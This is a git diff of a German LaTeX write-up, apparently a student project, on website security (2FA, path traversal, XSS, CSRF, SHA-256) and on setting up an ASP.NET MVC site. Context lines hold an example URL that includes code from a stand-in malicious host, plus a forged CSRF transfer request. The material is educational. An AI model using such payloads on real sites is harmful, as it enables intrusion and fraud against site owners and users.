@@ -1,18 +1,29 @@
 
-\section{Webseite}
+\chapter{Webseite}
 \label{sec:Webseite}
-\subsection{Security}
+\section{Webseite-Security}
 \label{sec:Security}
 In diesem Abschnitt beschäftigen wir uns mit der Security der Webseite.
 Wir behandeln wie man das sichere einloggen in eine Webseite gewähren kann, 
 wie man sich vor XSS/CSRF schützen kann, wie man verhindert das eine SQL Injection
 möglich ist und wie man Passwörter speichert. Dazu werden wir einige Code Beispiele anführen.
 
-\subsubsection{Login Handling}
+\subsection{Login Handling}
 \label{sec:Login}
-\subsubsection{Two-Factor-Auth}
+\subsection{Two-Factor-Auth}
 \label{sec:tfa}
-\subsubsection{Path-Traversal}
+\subsubsection{Was ist Two-Factor Authentication}
+Die Zweifaktorauthentifizierung (2FA) ist eine Art der Multi-Faktor-Authentifizierung. Es ist eine Methode, mit der der Benutzer über zwei verschiedene Faktoren seine Identität bestätigen kann.\\ \\
+Die dabei geltenden Faktoren lauten:
+\begin{enumerate}
+\item etwas, das sie wissen
+\item etwas, das sie haben
+\item etwas, das sie sind
+\end{enumerate}
+Ein gutes Beispiel für die Zweifaktorauthentifizierung ist die Behebung von Geld an einem Geldautomaten. Nur die korrekte Kombination einer Bankkarte (die der Benutzer besitzt) und einer PIN (die der Benutzer weiß) ermöglicht die Durchführung der Transaktion.\\ \\Als neueres Beispiel könnte man das Anmelden von seinem Google Account nehmen, wo man sein Passwort wissen muss und mit seinem Handy bestätigen, das man sich einloggen will, also etwas das man weiß und etwas was man hat. 
+
+(wikipedia)
+\subsection{Path-Traversal}
 \label{sec:Path-Traversal}
 Als Path-Traversal wird eine Security Lüge bezeichnet die es einem Angreifer, durch Manipulation des URLs auf Daten zuzugreifen, auf die er nicht zugriffen können sollte. 
 \subsubsection{Grundprinzip}
@@ -39,7 +50,7 @@ Unter Linux ist diese Schwäche kritischer da man hier auf die komplette Festpla
 Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese code einzufügen mit dem man sich noch mehr Möglichkeiten verschafft. \\ \\
 \url{http://some_site.com.br/some-page?page=http://BoeseSeite.com.br/other-page.htm/malicius-code.php}
 \subsubsection{Protection Path-Traversal}
-\subsubsection{XSS Protection}
+\subsection{XSS Protection}
 \label{sec:xss}
 \subsubsection{Allgemeines über XSS}
 XSS steht für Cross-Site-Scripting und ist eine Security schwäche, welche es ausnutzt das eine Webadmin nicht davon ausgeht das eine gewisse Eingabe getätigt wird. Meist nutzt ein Hacker diese Schwäche um einen bösartigen Code auszuführen, zu Beispielen werden wir später noch kommen. Trotz dem hohen Bekanntheitsgrad von XSS und findet man Cross-Site-Scripting immer noch aus der OWASP Top 10, welche die häufigsten Security Vulnerabilities Jahr für Jahr auflistet. Bei dem ausnutzen von XSS greift man sein 'Opfer' nicht direkt an, sondern man nutzt diese Schwachstelle, um bspw. ein bösartiges Skript zu platzieren, welches dann von einem nichts ahnenden User aufgerufen wird. 
@@ -118,7 +129,7 @@ Alle Möglichen Eingabefelder
 In den URLS werden durch MVC und passende Implementierung nie Parameter gesendet bei denen man XSS Code einfügen könnte.\\ \\
 Dadurch hat unsere Webseite eine Funktionierende XSS Protection
 
-\subsubsection{XSRF/CSRF Protection}
+\subsection{XSRF/CSRF Protection}
 \label{sec:csrf}
 \subsubsection{Was ist XSRF/CSRF}
 CSRF steht für Cross-Site Request Forgery. CSRF ist ein Angriff, bei dem das Opfer dazu gebracht wird, eine böswillige Anfrage zu übermitteln. Als Angreifer erbt man dabei die Identität und die Privilegien des Opfers und kann beispielsweise eine unerwünschte Funktion im Namen des Opfers ausführen. Bei den meisten Websites enthalten Browser-Anforderungen automatisch alle mit der Website verknüpften Anmeldeinformationen, z. B. Sitzungscookies des Benutzers, IP-Adresse, Anmeldeinformationen der Windows-Domäne usw. Wenn der Benutzer derzeit für die Seite authentifiziert ist, hat die Seite keine Möglichkeit, zwischen der vom Opfer gesendeten gefälschten Anfrage und einer vom Opfer gesendeten legitimen Anfrage zu unterscheiden.
@@ -146,7 +157,7 @@ acct=Angreifer&amount=1000
 \end{lstlisting}
 \subsubsection{Verhindern}
 \url{https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.2}
-\subsubsection{Hashes}
+\subsection{Hashes}
 \label{hash-expl}
 Wir beginnen die Erklärung von HASHes mit einem Beispiel.
 \\ \\
@@ -169,7 +180,7 @@ Beispiele
 \item SHA1
 \end{enumerate}
 Der Faktor Schnelligkeit ist sehr relevant, ist der Algorithmus zu langsam will ihn keiner nutzen, ist er aber zu schnell kann man recht einfach Dokument erstellen welches zwar anders ist aber den selben HASH als das Orginal hat.
-\subsubsection{Wie funktioniert ein HASH Algorithmus}
+\subsection{Wie funktioniert ein HASH Algorithmus}
 Wie ein HASH Algorithmus grundsätzlich arbeitet werde ich anhand von SHA-256 erklären. 
 \subsubsection{Allgemeines über SHA256}
 SHA256(secure hash algorithm) ist ein kryptografischer HASH mit eine Zeichenlänge von 256 bits. Es ist eine Schlüssellose HASH-Funktion.
@@ -194,9 +205,8 @@ Wobei
 \item ShR (A, n) bezeichnet die Rechtsverschiebung von n Bits des Binärworts A
 \item AkB bezeichnet die Verkettung der Binärwörter A und B
 \end{enumerate}
-SHA256 benutzt folgende Funktionen \\ \\
-
-\includegraphics[width=\textwidth height=\textheight]{Website_SHA256_Functions}
+SHA256 benutzt folgende Funktionen\\
+\includegraphics[width=300px,height=200px]{Website_SHA256_Functions}
 \subsubsection{Das Padding}
 Das Padding stellt sicher, dass die Nachricht ein Vielfaches von 512 Bits ist dafür wird folgendes getan.
 \begin{enumerate}
@@ -216,36 +226,55 @@ Für jeden Block M $\in$ {0, 1} 512 , 64 Wörter aus 32 Bits wird folgendermaße
 \end{enumerate}
 Formel 1:
 \\ \\
-\includegraphics[width=150px height=150px]{Webseite_SHA256_f1}
-\\ \\
-Formel 2:
-\\ \\
-\includegraphics[width=230px height=230px]{Webseite_SHA256_f2}
+\includegraphics[width=150px,height=30px]{Webseite_SHA256_f1}
+\\ \\Formel 2:\\ \\
+\includegraphics[width=280px ,height=30px]{Webseite_SHA256_f2}
 \\ \\
 (was passiert hier)
-\subsubsection{Password Hashes}
+\subsection{Password Hashes}
 \label{sec:hash}
 Wie die Wahl eines sicheren Passsworts vom Benutzer, ist es genau so wichtig für den Service Provider, dass dieser das Passwort seiner User hasht.
 
-\subsection{ASP.NET MVC}
+\section{ASP.NET MVC}
+\label{sec:MVC}
 In diesem Abschnitt beschäftigen wir uns mit ASP.NET MVC mit der unsere Webseite aufgebaut ist. Wir besprechen die Grundindention von MVC und was MVC ist. Wie die Webseite aufgebaut wurde werden wir anhand Code auszügen zeigen. Die beim MVC bekannten Views Controllers und Services werden aufgezeigt und erklärt. Ebenfalls wird behandelt wie die Links zu den Kalendern erzeugt und zur Verfügung gestellt werden. 
 
-\label{sec:MVC}
-\subsubsection{Allgemeines MVC}
+\subsection{Allgemeines MVC}
 \label{sec:allgemein}
-\subsubsection{Erstellung der Webseite}
+\subsection{Erstellung der Webseite}
+Dieses Kapitel befässt sich damit wie man in Visual-Studio ein MVC-Website Projekt erstellen kann.\\ \\
+Zunächst muss man sicherstellen das man alle benötigten Features installiert hat. Dafür geht man auf Datei -> Neues Projekt und klickt dann auf folgendes.\\
+\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_features}
+Im Installer überprüft man dann ob man folgende Features installiert hat.\\
+\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Install}
+Danach kann man ein MVC-Website Projekt erstellen dafür mach man folgendes.\\ \\
+Schritt 1:\\
+Zuerst müssen wir über File -> New -> Project, die Erstellung eines neuen Projekts einleiten.\\ \\
+\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt1}
+Schritt 2:\\
+Danach müssen wir unter dem Tab Web die ASP.NET Core Web Application wählen und ihr einen Namen zuweisen. Danach klicken wir auf Ok.\\ \\
+\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt2}
+Schritt 3:\\
+Nun muss das Modell gewählt werden, hier wählen wir die MVC Web-Application. Danach klicken wir auf Change Authentication. \\ \\
+\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt3}
+Schritt 4:\\
+In diesem Schritt müssen wir festlegen, das unsere Web-Anwendung User Daten speichert. \\ \\
+\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt4}
+Danach hat man erfolgreich eine MVC-Website erstellt und kann diese über IIS Express Lokal starten und testen. Macht man das ganze sieht man das ASP Template.
+\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Done}
+\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Preview}
 \label{sec:erstellung}
-\subsubsection{Aufbau der Webseite }
+\subsection{Aufbau der Webseite }
 \label{sec:aufbau}
-\subsubsection{Link generation}
+\subsection{Link generation}
 \label{sec:link}
-\subsubsection{Controller}
+\subsection{Controller}
 \label{sec:Controller}
-\subsubsection{Views}
+\subsection{Views}
 \label{sec:Views}
-\subsubsection{Services}
+\subsection{Services}
 \label{sec:Services}
-\subsubsection{User Datenbank}
+\subsection{User Datenbank}
 \label{sec:UserDB}
 \begin{itemize}
 	\item Salt
